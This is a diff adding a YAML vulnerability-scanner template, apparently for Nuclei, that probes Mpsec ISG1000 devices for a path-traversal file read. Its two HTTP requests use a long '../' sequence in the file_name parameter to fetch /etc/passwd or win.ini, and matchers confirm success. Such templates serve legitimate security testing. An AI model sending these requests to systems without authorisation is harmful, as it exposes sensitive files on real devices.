@@ -1,0 +1,34 @@
+id: Mpsec ISG1000 File Read
+info:
+  name: Mpsec ISG1000 File Read
+  author:nithissh
+  severity: high
+  description: An adversary can perform a File Read on the Server and read sensitive files
+  reference: unknown
+  tags: fileread,lfi
+
+requests:
+  - raw:
+      - |
+        GET /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
+
+      - |
+        GET /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 259
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: word
+        words:
+          - "for 16-bit app support"
+          - "root:"
+        condition: or
